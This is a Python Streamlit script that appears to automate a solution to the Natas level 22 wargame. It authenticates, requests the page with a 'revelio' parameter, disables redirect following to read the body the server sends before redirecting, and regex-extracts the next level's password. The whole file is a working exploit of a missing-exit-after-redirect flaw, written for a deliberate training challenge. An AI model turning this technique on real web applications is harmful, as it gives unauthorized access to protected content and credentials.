import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting Loose Execution Control via HTTP Redirect Header Interception...")
    
    # 1. Align active level credentials
    username = "natas22"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Target parameter string required to enter the redirection block
    target_url = f"{base_url}/index.php?revelio=1"
    st.write(f"📡 Dispatching query to target gateway: `{target_url}`")
    
    try:
        # 2. Transmit the request but explicitly disable automatic redirect tracking
        st.write("Intercepting response body prior to redirection execution...")
        response = session.get(target_url, allow_redirects=False, timeout=10)
        
        st.write(f" └─ Captured Status Code: `{response.status_code}`")
        
        # 3. Process the response content to extract the hidden credential data
        if response.text:
            # Locate all 32/64 character alphanumeric credentials
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 22 challenge resolved successfully!")
                st.code(f"Natas 23 Password: {new_tokens[0]}")
            else:
                st.warning("Redirection bypassed successfully, but no unique token sequence matched our filters.")
                with st.expander("Inspect Raw Intercepted Response Body"):
                    st.code(response.text, language="html")
        else:
            st.error("The server returned an empty body canvas signature.")
            
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")